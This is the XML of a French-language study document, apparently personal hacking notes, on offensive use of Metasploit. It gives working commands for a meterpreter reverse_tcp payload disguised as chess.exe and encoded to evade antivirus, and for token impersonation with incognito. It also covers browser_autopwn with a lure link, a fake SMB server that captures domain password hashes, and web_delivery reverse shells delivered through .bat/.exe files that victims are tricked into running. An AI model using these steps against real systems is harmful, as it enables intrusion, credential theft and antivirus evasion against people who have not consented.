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8pt" fo:font-weight="bold" style:font-size-asian="18pt" style:font-weight-asian="bold" style:font-size-complex="18pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>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Courier New"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font-name="Courier New" style:text-underline-style="none" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New"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ourier New" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14"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Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"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style:font-name="Times New Roman" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24"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font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>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Text_20_body" style:list-style-name="L3"/>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Courier New" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Courier New" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Times New Roman"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Times New Roman" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-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fférents modules bla bla ...</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4">La fonction "search" :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">Depuis que Metasploit s'est beaucoup développé il était temps d'inclure cette fonction de recherche. Du coup on utilise cette fonction comme ça : </text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P9">msf &gt; search type:exploit platform:solaris sunrpc</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">... Avec en premier le type de hack, en second la plateforme (l'OS qu'on veut attaquer), et en dernier le service qu'on veut attaquer.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">Les commandes basiques de metasploit :</text:p>
      <text:p text:style-name="P15"/>
      <text:list xml:id="list4544270035730610432" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P23">La commande <text:span text:style-name="T1">show</text:span>, très utilisée, pour voir tous les exploits ou les options d'un exploit quand il est sélectionné et qu'on écrit show options.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Info</text:span> quand on est dans un module nous donne les infos de ce module, important, toujours l'utiliser.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Set </text:span>(puis pas exemple RHOST) est très important aussi ofc.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Back</text:span> pour retourner vers msf après avoir selectionné un exploit.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Use</text:span> pour sélectionner un exploit.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Exploit</text:span> pour lancer l'exploit une fois que tout est paré.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23"><text:span text:style-name="T1">Sessions</text:span> pour lister les sessions ouvertes (par exemple sessions meterpreter sur d'autres systèmes)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P26">Exit</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P15">Les payloads :</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P14">3 types principaux :</text:p>
      <text:list xml:id="list6230101994782026283" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T6">Stagers : "</text:span>Stagers are the small payloads whose only job is to fit into small memory area and then "pull" the larger staged payload along. They kind of "plant the flag" on the victim and then enable the larger payload to be loaded".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27">Staged : par exemple meterpreter, se sont des payloads complexes tirés par les stagers. La synthax pour ces payloads stagers / staged est souvent <text:span text:style-name="Emphasis">windows/shell/tcp_bind</text:span> with "tcp_bind" the stager (see below) and "shell" the staged (synthaxe parfois non-respectée).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27">Inline / singles : fonctionne en 1 bloc, c'est les plus stables mais ils sont aussi souvent trop gros pour la mémoire vulnérable de l'ordinateur. </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">(pour accéder à la liste de ces 3 types de payloads, aller dans <text:span text:style-name="T1">metaploit-framework/modules/payloads</text:span> et changer de dossier ou lister).</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Autres types de payloads plus spécifiques : Ipv6 (basé sur protocoles réseau IPv6), Ord (marche sur toutes les distributions Windows, très petit, mais assez instable), NoNX (payloads qui contournent les sécurités Non-exécutables des CPU modernes) , PassiveX (quand le firewall prévient tout traffic, les payloads PassiveX utilise des requêtes HTTP identiques à celles d'un navigateur lamda).</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P4">Msfvenom : cacher ses payloads / exploits</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">Je vais être assez court ici vu que c'est loin d'être une méthode infaillible. On peut encoder nos <text:soft-page-break/>payloads / exploits afin d'en cacher la signature à un antivirus, cependant les antivirus se sont adaptés assez rapidement et c'est plus méga efficace. Enfin bref, l'idée c'est de faire un truc du genre : </text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis">msf &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST= &lt;your local IP&gt; LPORT=&lt;whatever port you want to listen on&gt; -x /usr/share/chess.exe -e x86/shikata_ga_nai -i 200 -f exe &gt;chess.exe</text:span> </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">... Pour un exploit qui a besoin comme options de LHOST et de LPORT, qui crée un exécutable qui, quand exécuté, tente d'établir une connection avec la machine locale si on écoute avec le handler. Ici donc on crée notre fichier et on l'encode (après -x) avec shikata_ga_nai sur 200 itérations pour en cacher la signature.</text:p>
      <text:p text:style-name="P15">Ici on utilise chess.exe, mais toi essaie de prendre des templates par défaut de metaploit, dans <text:span text:style-name="Strong_20_Emphasis">/usr/share/metasploit-framework/data/templates</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T10">.</text:span></text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Pour afficher les méthodes d'encodage : <text:span text:style-name="T1">msfvenom -l encoders</text:span><text:span text:style-name="T5">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Gagner les tokens d'accès sur un système avec incognito</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P7"><text:span text:style-name="T6">Qu'est-ce qu'un token ? </text:span>In Windows, a token is an object that contains the identity and privileges of the user. When a user logs in, their identity is verified by checking their password against the stored, hashed password list and, if it matches, they are allowed in. The system then issues a token to the user that contains their privileges. Whenever the user wants to access a resource or process, the token is presented to determine whether they are permitted access. </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Donc si on peut récupérer les tokens d'un utilisateur / d'un administrateur, alors on peut ne pas cracker le mot de passe de cet utilisateur et quand même avoir ses accès. C'est possible de manière relativement aisée (ne marche que sur WINDOWS, pas sur Metasploitable ou autres distributions Linux). </text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Ce qu'il faut d'abord, c'est gagner un accès meterpreter sur la machine attaquée, par exemple avec notre méthode du pdf_embedded pour windows 7 et 8. Une fois qu'on a meterpreter :</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P11">meterpreter &gt; use incognito<text:tab/><text:span text:style-name="T5">// Permet de charger l'extension incognito de msplt.</text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P11">Meterpreter &gt; list_tokens -u<text:tab/><text:span text:style-name="T5">// Liste les tokens disponibles sur le système cible.</text:span></text:p>
      <text:p text:style-name="P11">Meterpreter &gt; impersonate_token IE8WIN7\\IEUser <text:span text:style-name="T5">// Permet de répliquer le <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>token cible. Fonctionne <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>pour test sur Windows 7.</text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Autopwn :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Une feature de Metasploit si tu veux hacker quelque chose sans avoir besoin d'être particulièrement discret, et pour s'éviter toute la partie de la reconnaissance. </text:p>
      <text:p text:style-name="P14">Normalement, on doit passer au travers d'un travail assez long de reconnaissance, pour fingerprint l'OS, connaître les applications (ports ouverts), les versions de Java, de Flash, de vsftpd etc... </text:p>
      <text:p text:style-name="P14">Autopwn permet tout d'abord de fingerprint le browser de la victime, puis de jeter tous les exploits <text:soft-page-break/>qui pourraient marcher sur la victime en espérant que l'un d'entre eux fonctionne. Bien sûr, le risque c'est que c'est très facilement repérable (très bruyant), et que ça risque de faire crash le browser. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">La première chose à faire, c'est dans msfconsole d'utiliser l'exploit :</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">msf&gt; use auxiliary/server/browser_autopwn</text:span></text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Ensuite on peut s'occuper des options. Il faut indiquer l'hôte local en premier :</text:p>
      <text:p text:style-name="P8">msf &gt; set LHOST 192.168.1.22</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">Pour fingerprint le browser de la victime, il faut que celle-ci clique sur un lien de notre serveur, on peut personnaliser le lien pour le rendre plus attractif (sinon c'est random) :</text:p>
      <text:p text:style-name="P8">msf &gt; set URIPATH null_byte</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">Maintenant, quand la victime va sur l'URL générée (ici <text:a xlink:type="simple" xlink:href="http://192.168.1.22:8080/null_byte" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://192.168.1.22:8080/null_byte</text:a>), autopwn (qui tourne toujours en background) va s'activer, essayer de fingerprint le brower et commencer à balancer les exploits.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Une fois que c'est fini (prend un certain temps), on retourne sur Metasploit et on vérifie si une ou plusieurs sessions ont pu être ouvertes grâce à autopwn, avec la commande :</text:p>
      <text:p text:style-name="P8">msf &gt; sessions -l</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">Puis, si une ou plusieurs session(s) a/ont été ouverte(s), on peut y accéder par :</text:p>
      <text:p text:style-name="P8">msf &gt; sessions -i 1<text:tab/><text:tab/><text:span text:style-name="T5">// Pour ouvrir la session n°1</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P15">Capture domain passwords (fake smb server) :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Jusqu'ici on a récupéré des hash de mot de passe, ou des mots de passe sur des systèmes locaux. Mais pour de plus grandes structures où les ordinateurs locaux font partie d'un domaine, les mots de passe sont stockés sur le Domain Controller (DC). </text:p>
      <text:p text:style-name="P2">One of the more powerful features built into Metasploit is the ability to set up a fake SMB server. This means that when someone on the network attempts to access the SMB server, their system will need to present their credentials in terms of their domain password hash. Very often, large networks have a system that systematically connects to each machine to check whether they are patched and secure. When it does so, it must present its credentials to each system and this will usually use the admin password. If we are patient, this may be the best strategy.</text:p>
      <text:p text:style-name="P3">In addition, by setting up this fake SMB server, we may be able to capture domain credentials as users attempt to authenticate against it. We could send the target an embedded UNC path, and when they click on it, we can grab their domain credentials.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Bref, pour commencer on va sur Metasploit et on utilise le module correspondant, qui n'est ni un exploit, ni un payload :</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8">msf &gt; use auxiliary/server/capture/smb</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">Ensuite il va falloir s'occuper des options. Ici, on a qu'une seule option à mettre, qui précise qu'on veut les hash de mots de passe sous un format que John The Ripper peut facilement forcer. On fait :</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">msf &gt; set JOHNPWFILE /root/domainhashes</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Pour avoir les hash de mots de passe dans le fichier domainhashes de root sous le format john. Puis <text:soft-page-break/>on peut taper <text:span text:style-name="T1">exploit</text:span><text:span text:style-name="T5">, ce qui va démarrer le serveur.</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Maintenant que notre serveur SMB est en route, on doit faire en sorte que quelqu'un </text:span><text:span text:style-name="T7">du même réseau</text:span><text:span text:style-name="T8"> (apparemment ne fonctionne pas en dehors) se connecte à notre "share". Pour ça, on peut trick une personne pour qu'elle écrive :</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P12">net use \\192.168.1.21</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P17">Ce qui a pour effet que de connecter son ordinateur à notre réseau. Cela va lui demander son identifiant et son mot de passe, qu'il renseigne. Le serveur renvoie que ce n'est pas les bons, et de notre côté on récupère les mots de passe. C'est plutôt compliqué que de mener quelqu'un à écrire une telle commande, c'est pourquoi apparemment c'est aussi possible de lui envoyer ça sous forme de lien UNC (le problème c'est que les navigateurs ont maintenant des sécurités qui empêchent d'ouvrir des liens qui rebalancent sur le réseau local, seul Internet Explorer admet ça).</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P14"><text:span text:style-name="T11">Après, pour cracker le hash avec John, on écrit comme d'hab : </text:span><text:span text:style-name="T3">john /root/domainhashes</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P18">Ajouter des exploits / modules dans Metasploit :</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P7"><text:span text:style-name="T6">Aller dans Exploit Database par exemple. Chercher un exploit codé pour metasploit en tapant le nom de l'exploit dans la zone de Free Text, et Metasploit dans Auteur. Copier l'intégrité du code de l'exploit, et le sauvegarder sous un nom quelconque (pour l'exploit Joomla Kickstart, </text:span>"<text:span text:style-name="T1">joomla_kicktstart.rb</text:span>" par exemple.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Ensuite il faut créer un dossier + sous-dossier que Metasploit peut comprendre. Ici pour notre exploit joomla :</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P7"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">kali &gt; mkdir -p /root/.msf4/modules/exploits/unix/joomla</text:span></text:span></text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Avec l'option -p pour créer les sous-dossiers également. Ensuite il ne nous reste plus qu'à déplacer notre exploit copié dans ce dossier. Maintenant on devrait pouvoir trouver l'exploit sur Metasploit avec son nom. </text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Finding deleted web pages :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Ces derniers temps, les webmasters ont été + vigilants quant à ce qu'il exposent sur leur site web. Mais si on retourne un peu dans le passé, ce n'était pas le cas : on avait des listes d'adresses e-mail, voire de mots de passe sur le site, sans que les développeurs s'imaginent que quelqu'un pourrait y avoir accès. Or, en fouillant un peu, si ces contenus ne sont pas spécialement protégés / sont dans des répertoires non-protégés, on peut y avoir accès assez facilement. </text:p>
      <text:p text:style-name="P14">Il est possible, au travers de metasploit, d'accéder aux anciennes pages web aujourd'hui supprimées grâce au site Archive.org et sa Wayback Machine. Si le site a un jour stocké ses adresses mail ou ses scan Nessus (scan de vulnérabilités web le plus répandu, parfois mis sur le site pour le personnel de sécurité ou de réseau), alors on peut les retrouvés sur Archive.org, et plus généralement sur metasploit qui nous permet d'y accéder grâce à ses modules <text:span text:style-name="T15">auxiliary</text:span>. </text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">On lance metasploit, puis on navigue jusqu'à l'utilitaire nous permettant d'accéder à la Wayback Machine :</text:p>
      <text:p text:style-name="P14"><text:soft-page-break/></text:p>
      <text:p text:style-name="P8">use auxiliary/scanner/http/enum_wayback</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Dans les options, il faut renseigner :</text:p>
      <text:p text:style-name="P14">1. Le domaine qu'on veut scanner : set DOMAIN sans.org</text:p>
      <text:p text:style-name="P14">2. Le fichier où on veut stocker tout ça : set OUTFILE sans_wayback</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">A partir de là on est prêt, on a plus qu'à taper <text:span text:style-name="T1">run</text:span><text:span text:style-name="T5">. </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Une fois qu'on a récupéré dans notre fichier toutes les URL que Archive.org a mis à notre disposition, on peut commencer à les décortiquer avec </text:span><text:span text:style-name="T1">grep</text:span><text:span text:style-name="T5">. Par exemple si on veut récupérer toutes les URL en relation avec les adresses e-mail, </text:span><text:span text:style-name="T1">grep</text:span><text:span text:style-name="T5"> a une option toute faîte :</text:span></text:p>
      <text:p text:style-name="P8">sans_wayback | grep email</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">On peut aussi rechercher les URL amenant vers des scans nessus :</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8">sans_wayback | grep nessus</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14">On peut ensuite examiner les URLs intéressantes qu'on a récupéré sur Archive.org pour voir si on peut trouver des informations textuelles à partir de ces URLs. </text:p>
      <text:p text:style-name="P14">On pourrait également télécharger le contenu de ces URL directement sur un hard drive en utilisant .....</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">HTTrack :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Mimikatz :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Peut être intéressant sur une machine Windows en post-exploitation. Mimikatz permet de récupérer divers credentials, les méthodes de cryptographie également, ou d'exécuter des commandes personnalisées. Je laisse ça de côté pour l'instant dans le sens où j'ai aucune idée de l'utilité des credentials qu'on récupère, et qu'il faut avoir ouvert meterpreter sur le system cible avec des droits d'administrateur (or la commande getsystem est loin de toujours fonctionner). </text:p>
      <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz-0168208/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz-0168208/</text:a></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Web Delivery hack for Linux and Mac :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">La famille de ces hacks sont les web delivery exploits. En gros ces exploits nous permettent d'initialiser un serveur web sur la machine attaquante, pour ensuite download un payload sur la machine cible quand celle-ci entre un simple script (il faut avoir accès à la machine, ou bien envelopper ce script dans un objet apparemment inoffensif, ou bien exploiter une faille XMS Cross-Site-Scripting).</text:p>
      <text:p text:style-name="P14">Cette partie ne fonctionne que pour Linux ou Mac puisque ceux-ci ont des interprêteurs Python built-in.</text:p>
      <text:p text:style-name="P14">Une dernière chose : cet exploit est plutôt stealthy, peu de chances que les antivirus puissent le remarquer.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/>L'exploit se situe là :</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T4">msf &gt; </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">use exploit/multi/script/web_delivery</text:span></text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P17">Pour les options à entrer il nous faut :</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P12">msf &gt; set LHOST 192.168.1.21</text:p>
      <text:p text:style-name="P12">msf &gt; set LPORT 4444</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P17">(Of course, I am using my private IP address in my lab, but if the target is outside your LAN, you will likely need to use your public IP and then port forward.)</text:p>
      <text:p text:style-name="P17">Un dernier petit réglage pour indiquer qu'on veut utiliser Python :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P8">msf &gt; set target 0</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Il ne reste plus qu'à <text:span text:style-name="T1">exploit</text:span><text:span text:style-name="T5">. Le serveur est démarré, et attend maintenant que la victime exécute la commande notée tout en bas. Pour les systèmes Linux et OS, il va falloir amener la victime à taper cette commande dans la ligne de commande, ou le faire nous-mêmes, ce qui peut être assez difficile (c'est pour ça que ce hack est peut-être + efficace contre un système Windows). </text:span></text:p>
      <text:p text:style-name="P14">Si la session est démarrée en arrière-plan, on peut comme d'hab partir sur du :</text:p>
      <text:p text:style-name="P8">session -l</text:p>
      <text:p text:style-name="P8">session -i 1</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Web delivery hack for Windows :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Le début est exactement le même que pour Linux &amp; Mac : on utilise l'exploit dans Metasploit :</text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T4">msf &gt; </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">use exploit/multi/script/web_delivery</text:span></text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Comme d'habitude, il faut définir LHOST et LPORT, pas de différence à ce niveau. La différence va se faire quand il va falloir définir la target. En effet, pour que l'exploit soit efficace dans un systèm Windows qui n'a pas par défaut Python d'installé, il va falloir que notre exploit soit écris en Powershell. Pour cela :</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8">msf &gt; set target 2</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">(apparement il faut aussi <text:span text:style-name="T1">set URIPATH powersploit</text:span> ou peu importe le nom).</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Ensuite il faut définir le payload à charger depuis notre exploit :</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">msf &gt; set payload windows/powershell_reverse_tcp</text:span></text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P14">Utilisons ce payload classique pour les systèmes Windows. Maintenant, on n'a plus qu'à <text:span text:style-name="T1">exploit</text:span> et attendre que la victime exécute la commande qui s'affiche en dernier quand on a exploité. Pour cela, une des options est d'envoyer un fichier .bat par exemple.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P19">Créer un fichier .bat pour exécuter une commande sur un système Windows : <text:span text:style-name="T11">Il suffit simplement de créer un fichier texte, taper tel quel les instructions qu'on veut voir exécutées dans la ligne de commandes, puis enregistrer le fichier avec une extension .bat. Ensuite, quand on va double cliquer dessus, les commandes qui se trouvent à l'intérieur vont toutes s'exécuter (on peut l'utiliser pour détruire un système de manière très directe, ou bien pour le Web Delivery Hack qui target Windows. </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P19">Transformer notre fichier .bat en .exe : <text:span text:style-name="T11">des utilitaires en ligne le font très bien, on peut ensuite envoyer le .exe qui, si il est lancé, exécute les commandes nous permettant de prendre le contrôle.</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/>[<text:span text:style-name="T16">FIX POUR LE WEB DELIVERY EXPLOIT FAISANT CRASH POWERSHELL]</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P5">Le web delivery exploit fonctionne avec pour cible des ordinateurs Windows à partir de Metasploit : </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; use exploit/multi/script/web_delivery</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; set TARGET 2</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; set payload generic/shell_reverse_tcp</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; set URIPATH update</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; set LHOST xxx.xxx.x.x</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; set LPORT 8081</text:span></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T18">&gt; exploit</text:span></text:span></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">Ensuite, il va falloir faire un fichier de type .bat pour exécuter la commande powershell sur l'ordinateur de la victime.</text:span></text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P18">Possibilité de scripter des actions répétitives, comme la mise en place d'un multi/handler par exemple :</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P20"><text:a xlink:type="simple" xlink:href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-14-creating-resource-script-files-0169962/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://null-byte.wonderhowto.com/how-to/hack-like-pro-metasploit-for-aspiring-hacker-part-14-creating-resource-script-files-0169962/</text:span></text:a><text:span text:style-name="T12"> (à voir + tard éventuellement).</text:span></text:p>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text:soft-page-break/>Liste des commandes basiques de meterpreter :</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P1">Core</text:p>
      <text:list xml:id="list8976795575335142717" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P35">background - moves the current session to the background </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">? - help menu</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">bgkill - kills a background meterpreter script </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">bglist - provides a list of all running background scripts </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">bgrun - runs a script as a background thread </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">channel - displays active channels </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">close - closes a channel </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">exit - terminates a meterpreter session </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">help - help menu </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">interact - interacts with a channel </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">irb - go into Ruby scripting mode </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">migrate - moves the active process to a designated PID </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">quit - terminates the meterpreter session </text:p>
        </text:list-item>
        <text:list-item>
